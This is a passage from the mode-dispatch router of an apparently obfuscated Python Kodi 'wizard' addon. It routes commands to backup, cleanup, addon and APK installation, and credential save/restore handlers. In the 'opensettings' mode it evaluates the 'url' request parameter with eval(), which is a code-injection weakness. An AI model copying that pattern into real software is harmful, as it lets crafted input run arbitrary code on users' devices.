elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5072
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5073
elif mode =='asciicheck':wiz .asciiCheck ()#line:5074
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5075
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5076
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5077
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5078
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5079
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5080
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5081
elif mode =='currentsettings':viewAdvanced ()#line:5082
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5083
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5084
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5085
elif mode =='fixskin':backtokodi ()#line:5086
elif mode =='testcommand':testcommand ()#line:5087
elif mode =='rdon':rdon ()#line:5088
elif mode =='rdoff':rdoff ()#line:5089
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5090
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5091
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5092
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5093
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5094
elif mode =='freshstart':freshStart ()#line:5095
elif mode =='forceupdate':wiz .forceUpdate ()#line:5096
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5097
elif mode =='forceclose':wiz .killxbmc ()#line:5098
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5099
elif mode =='hidepassword':wiz .hidePassword ()#line:5100
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5101
elif mode =='enableaddons':enableAddons ()#line:5102
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5103
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5104
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5105
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5106
elif mode =='uploadlog':uploadLog .Main ()#line:5107
elif mode =='viewlog':LogViewer ()#line:5108
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5109
elif mode =='viewerrorlog':errorChecking (all =True )#line:5110
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5111
elif mode =='purgedb':purgeDb ()#line:5112
elif mode =='fixaddonupdate':fixUpdate ()#line:5113
elif mode =='removeaddons':removeAddonMenu ()#line:5114
elif mode =='removeaddon':removeAddon (name )#line:5115
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5116
elif mode =='removedata':removeAddonData (name )#line:5117
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5118
elif mode =='systeminfo':systemInfo ()#line:5119
elif mode =='restorezip':restoreit ('build')#line:5120
elif mode =='restoregui':restoreit ('gui')#line:5121
elif mode =='restoreaddon':restoreit ('addondata')#line:5122
elif mode =='restoreextzip':restoreextit ('build')#line:5123
elif mode =='restoreextgui':restoreextit ('gui')#line:5124
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5125
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5126
elif mode =='apk':apkMenu (name )#line:5128
elif mode =='apkscrape':apkScraper (name )#line:5129
elif mode =='apkinstall':apkInstaller (name ,url )#line:5130
elif mode =='speed':speedMenu ()#line:5131
elif mode =='net':net_tools ()#line:5132
elif mode =='GetList':GetList (url )#line:5133
elif mode =='youtube':youtubeMenu (name )#line:5134
elif mode =='viewVideo':playVideo (url )#line:5135
elif mode =='addons':addonMenu (name )#line:5137
elif mode =='addoninstall':addonInstaller (name ,url )#line:5138
elif mode =='savedata':saveMenu ()#line:5140
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5141
elif mode =='managedata':manageSaveData (name )#line:5142
elif mode =='whitelist':wiz .whiteList (name )#line:5143
elif mode =='trakt':traktMenu ()#line:5145
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5146
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5147
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5148
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5149
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5150
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5151
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5152
elif mode =='realdebrid':realMenu ()#line:5154
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5155
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5156
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5157
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5158
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5159
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5160
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5161
elif mode =='login':loginMenu ()#line:5163
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5164
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5165
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5166
elif mode =='clearlogin':loginit .clearSaved (name )#line:5167
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5168
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5169
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5170
elif mode =='contact':notify .contact (CONTACT )#line:5172
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5173
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5174
elif mode =='developer':developer ()#line:5176
elif mode =='converttext':wiz .convertText ()#line:5177
elif mode =='createqr':wiz .createQR ()#line:5178
elif mode =='testnotify':testnotify ()#line:5179
elif mode =='testnotify2':testnotify2 ()#line:5180
elif mode =='servicemanual':servicemanual ()#line:5181
elif mode =='fastinstall':fastinstall ()#line:5182
elif mode =='testupdate':testupdate ()#line:5183
elif mode =='testfirst':testfirst ()#line:5184
elif mode =='testfirstrun':testfirstRun ()#line:5185
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5186
elif mode =='bg':wiz .bg_install (name ,url )#line:5188
elif mode =='bgcustom':wiz .bg_custom ()#line:5189
elif mode =='bgremove':wiz .bg_remove ()#line:5190
elif mode =='bgdefault':wiz .bg_default ()#line:5191
elif mode =='rdset':rdsetup ()#line:5192
elif mode =='mor':morsetup ()#line:5193
elif mode =='mor2':morsetup2 ()#line:5194
elif mode =='resolveurl':resolveurlsetup ()#line:5195
elif mode =='urlresolver':urlresolversetup ()#line:5196
elif mode =='forcefastupdate':forcefastupdate ()#line:5197
elif mode =='traktset':traktsetup ()#line:5198
elif mode =='placentaset':placentasetup ()#line:5199
elif mode =='flixnetset':flixnetsetup ()#line:5200
elif mode =='reptiliaset':reptiliasetup ()#line:5201
elif mode =='yodasset':yodasetup ()#line:5202
elif mode =='numbersset':numberssetup ()#line:5203
elif mode =='uranusset':uranussetup ()#line:5204
elif mode =='genesisset':genesissetup ()#line:5205
elif mode =='fastupdate':fastupdate ()#line:5206
elif mode =='folderback':folderback ()#line:5207
elif mode =='menudata':Menu ()#line:5208
elif mode ==2 :#line:5210
        wiz .torent_menu ()#line:5211
elif mode ==3 :#line:5212
        wiz .popcorn_menu ()#line:5213
elif mode ==8 :#line:5214
        wiz .metaliq_fix ()#line:5215
elif mode ==9 :#line:5216
        wiz .quasar_menu ()#line:5217
elif mode ==5 :#line:5218
        swapSkins ('skin.Premium.mod')#line:5219
elif mode ==13 :#line:5220
        wiz .elementum_menu ()#line:5221
elif mode ==16 :#line:5222
        wiz .fix_wizard ()#line:5223
elif mode ==17 :#line:5224
        wiz .last_play ()#line:5225
elif mode ==18 :#line:5226
        wiz .normal_metalliq ()#line:5227
elif mode ==19 :#line:5228
        wiz .fast_metalliq ()#line:5229
elif mode ==20 :#line:5230
        wiz .fix_buffer2 ()#line:5231
elif mode ==21 :#line:5232
        wiz .fix_buffer3 ()#line:5233
elif mode ==11 :#line:5234
        wiz .fix_buffer ()#line:5235
elif mode ==15 :#line:5236
        wiz .fix_font ()#line:5237
elif mode ==14 :#line:5238
        wiz .clean_pass ()#line:5239
elif mode ==22 :#line:5240
        wiz .movie_update ()#line:5241
elif mode =='adv_settings':buffer1 ()#line:5242
elif mode =='getpass':getpass ()#line:5243
elif mode =='setpass':setpass ()#line:5244
elif mode =='setuname':setuname ()#line:5245
elif mode =='passandUsername':passandUsername ()#line:5246
elif mode =='9':disply_hwr ()#line:5247
elif mode =='99':disply_hwr2 ()#line:5248
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))